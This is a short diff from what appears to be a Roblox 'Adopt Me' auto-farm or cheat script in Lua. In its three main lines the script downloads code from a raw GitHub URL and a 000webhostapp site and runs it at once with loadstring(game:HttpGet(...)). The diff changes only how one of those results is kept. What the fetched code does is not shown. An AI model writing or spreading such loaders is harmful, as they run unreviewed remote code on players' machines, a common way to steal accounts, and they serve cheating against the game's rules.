@@ -10,7 +10,7 @@ local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 local CurrentCamera = Workspace.CurrentCamera
 loadstring(game:HttpGet("https://raw.githubusercontent.com/daboyszzzzz/xxx/main/zz"))()
-local blacklist = loadstring(game:HttpGet("https://adoptmescriptxyz.000webhostapp.com/blacklist.lua"))()
+loadstring(game:HttpGet("https://adoptmescriptxyz.000webhostapp.com/blacklist.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AdoptMeAutoFarm/AdoptMeV2Gui/main/xxx"))()
 
 
